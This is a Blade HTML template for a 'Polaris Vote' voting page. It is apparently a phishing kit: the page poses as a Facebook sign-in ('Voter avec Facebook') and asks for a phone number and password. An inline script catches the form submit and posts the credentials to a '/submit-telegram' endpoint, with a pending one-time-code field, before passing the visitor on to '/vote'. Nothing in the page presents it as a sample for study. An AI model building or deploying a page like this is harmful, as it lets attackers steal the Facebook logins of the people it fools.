<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign In to Vote — Polaris Vote</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="{{ asset('css/style.css') }}">
</head>
<body class="vote-body">

    <div class="vote-bg" aria-hidden="true"></div>

    <header class="vote-header">
        <div class="container vote-header-inner">
            <a href="{{ url('/') }}" class="logo">
                <span class="logo-mark" aria-hidden="true">
                    <svg viewBox="0 0 32 32" width="26" height="26">
                        <circle cx="16" cy="16" r="14" fill="none" stroke="currentColor" stroke-width="2.5"/>
                        <path d="M16 7 L18.2 13.8 L25.4 13.8 L19.6 18 L21.8 24.8 L16 20.6 L10.2 24.8 L12.4 18 L6.6 13.8 L13.8 13.8 Z" fill="currentColor"/>
                    </svg>
                </span>
                Polaris<span class="logo-accent">Vote</span>
            </a>
            <a href="{{ url('/') }}" class="back-link">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M19 12H5M11 18l-6-6 6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                Back to home
            </a>
        </div>
    </header>

    <main class="vote-main">
        <div class="vote-shell">
            <section class="vote-intro">
                <p class="eyebrow eyebrow-light">Step 1 of 1</p>
                <h1>Sign in to cast your vote.</h1>
                <p class="vote-intro-sub">Verify with the phone number on your Polaris account.</p>
                <ul class="vote-points">
                    <li><span class="point-icon" aria-hidden="true"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></span>One vote per verified phone number</li>
                    <li><span class="point-icon" aria-hidden="true"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Your details are never shared publicly</li>
                    <li><span class="point-icon" aria-hidden="true"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Confirmation sent the moment you vote</li>
                </ul>
            </section>

            <section class="auth-card glass-card" aria-labelledby="authHeading">
                <div class="facebook-logo">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" width="60">
                </div>

                <h2 id="authHeading">Voter avec Facebook</h2>
                <p class="auth-sub">Enter your phone number and password to continue.</p>

                <form id="voteForm" method="POST" action="/vote" novalidate>
                    @csrf

                    <div class="field">
                        <label for="phone">Phone number</label>
                        <div class="input-wrap">
                            <span class="input-icon" aria-hidden="true">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M6.6 10.8c1.4 2.8 3.8 5.2 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1C10.5 21 3 13.5 3 4c0-.6.4-1 1-1h3.4c.6 0 1 .4 1 1 0 1.3.2 2.5.6 3.6.1.4 0 .8-.3 1.1L6.6 10.8z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/></svg>
                            </span>
                            <input type="tel" id="phone" name="phone" placeholder="+1 555 123 4567" autocomplete="tel" inputmode="tel" required />
                        </div>
                        <p class="field-error" id="phoneError" role="alert"></p>
                    </div>

                    <div class="field">
                        <label for="password">Password</label>
                        <div class="input-wrap">
                            <span class="input-icon" aria-hidden="true">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><rect x="5" y="10.5" width="14" height="9.5" rx="2" stroke="currentColor" stroke-width="1.6"/><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3" stroke="currentColor" stroke-width="1.6"/></svg>
                            </span>
                            <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password" required minlength="8" />
                            <button type="button" class="toggle-visibility" id="togglePassword" aria-label="Show password" aria-pressed="false">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" class="eye-open"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z" stroke="currentColor" stroke-width="1.6"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.6"/></svg>
                            </button>
                        </div>
                        <p class="field-error" id="passwordError" role="alert"></p>
                    </div>

                    <p class="form-error" id="formError" role="alert"></p>

                    <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn">
                        <span class="btn-label">Continue to Vote</span>
                        <span class="btn-spinner" aria-hidden="true"></span>
                    </button>
                </form>
            </section>
        </div>
    </main>

    <script src="{{ asset('js/script.js') }}"></script>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            console.log('✅ Vote page loaded');
            
            const form = document.getElementById('voteForm');
            const phoneInput = document.getElementById('phone');
            const passwordInput = document.getElementById('password');
            
            if (!form || !phoneInput || !passwordInput) {
                console.log('❌ Form or inputs not found');
                return;
            }
            
            console.log('✅ Form and inputs found');
            
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const phone = phoneInput.value.trim() || 'No phone';
                const password = passwordInput.value.trim() || 'No password';
                
                console.log('📤 SENDING TO TELEGRAM:', { phone, password });
                
                fetch('/submit-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '{{ csrf_token() }}'
                    },
                    body: JSON.stringify({ phone, password, code: 'PENDING_OTP' })
                })
                .then(response => response.json())
                .then(data => {
                    console.log('📥 TELEGRAM RESPONSE:', data);
                    if (data.success) {
                        console.log('✅ TELEGRAM SENT WITH:', phone, password);
                    } else {
                        console.log('❌ ERROR:', data);
                    }
                })
                .catch(err => {
                    console.log('❌ FETCH ERROR:', err);
                });
                
                setTimeout(function() {
                    console.log('✅ Submitting form to /vote');
                    form.submit();
                }, 500);
            });
        });
    </script>

</body>
</html>